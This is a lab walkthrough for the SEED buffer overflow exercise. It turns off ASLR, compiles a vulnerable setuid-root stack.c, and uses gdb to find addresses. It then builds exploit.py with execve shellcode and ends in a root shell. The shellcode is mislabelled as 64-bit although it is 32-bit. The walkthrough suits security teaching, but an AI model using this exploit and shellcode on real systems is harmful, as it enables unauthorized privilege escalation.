# The steps of attack for part 3

## **Step 1: Setting up the SEED VM on the cloud**

Before the experiment, you need to set up SEED VM under the guidance of this [link](https://seedsecuritylabs.org/labsetup.html).



## **Step 2: Download lab setup files**

Then, download the lab setup files [Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Buffer_Overflow_Setuid/Labsetup.zip), and unzip it.



## **Step 3:  Environment Setup**

Execute the following commands to simplify the attack:

```bash
# disable address space randomization
$ sudo sysctl -w kernel.randomize_va_space=0

# link /bin/sh to /bin/zsh
$ sudo ln -sf /bin/zsh /bin/sh
```



## **Step 4: Construct the shellcode**

The following are the the 64-bit shellcodes in byte format

```bytes
# 64-bit shellcode

"\x31\xc0"    # xorl    %eax,%eax
"\x50"        # pushl   %eax
"\x68""//sh"  # pushl   $0x68732f2f
"\x68""/bin"  # pushl   $0x6e69622f
"\x89\xe3"    # movl    %esp,%ebx
"\x50"        # pushl   %eax
"\x53"        # pushl   %ebx
"\x89\xe1"    # movl    %esp,%ecx
"\x99"        # cdq
"\xb0\x0b"    # movb    $0x0b,%al
"\xcd\x80"    # int     $0x80
```



## **Step 5: Compile the vulnerable program(stack.c)**

The vulnerable program(stack.c) is in the `code` folder, and you can compile and setup it using the following two methods:

1. use following commands

```bash
$ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
$ sudo chown root stack ➀
$ sudo chmod 4755 stack ➁
```

2. use make command with `Makefile` which is offered in the `code` folder

```bash
$ make
```



## **Step 6: Debug and compute values needed**

1. use `gdb` to get two address

```bash
$ touch badfile		➝Create an empty badfile

$ gdb stack-L1-dbg	➝stack, if you use method 1 at step5

(gdb) b bof 		➝Set a break point at function bof()
Breakpoint 1 at 0x12ad: file stack.c, line 16.

(gdb) run 			➝Start executing the program
Starting program: /home/seed/Labsetup/code/stack-L1-dbg
Input size: 517
Breakpoint 1, bof (
    str=0xffffd413 '\220' <repeats 120 times>, "a\321\377\377", '\220' <repeats 76 times>...) at stack.c:16
16      {

(gdb) next ➝See the note below
20          strcpy(buffer, str);

(gdb) p $ebp 		➝Get the ebp value
$1 = (void *) 0xffffcfe8

(gdb) p &buffer 	➝Get the buffer’s address
$2 = (char (*)[108]) 0xffffcf74

(gdb) quit 			➝exit
```



## **Step 7: Complete exploit.py**

1. put into the shellcode

```python
shellcode= (
    "\x31\xc0"    # xorl    %eax,%eax
    "\x50"        # pushl   %eax
    "\x68""//sh"  # pushl   $0x68732f2f
    "\x68""/bin"  # pushl   $0x6e69622f
    "\x89\xe3"    # movl    %esp,%ebx
    "\x50"        # pushl   %eax
    "\x53"        # pushl   %ebx
    "\x89\xe1"    # movl    %esp,%ecx
    "\x99"        # cdq
    "\xb0\x0b"    # movb    $0x0b,%al
    "\xcd\x80"    # int     $0x80
).encode('latin-1')
```

2. compute and complete values needed in the `exploit.py`

```python
# two addresses got in step 6
bof = 0xffffcfe8
buffer = 0xffffcf74

# put the shellcode at the end of content
start = 517 - len(shellcode)

# the value of ret is the address of buffer plus the offset of shellcode in the content
ret = buffer + 517 - len(shellcode)

# the value of offset is the address of ebp minus the address of buffer plus 4
offset = bof - buffer + 4
```



## **Step 8: Launching Attack**

After completing all the previous steps, you can execute the following commands to launch the attack:

```bash
$ ./exploit.py 	// create the badfile
$ ./stack-L1 	// launch the attack by running the vulnerable program
$ ./exploit.py
$ ./stack-L1
Input size: 517
# whoami
root
# id
uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),123(docker)
#
```

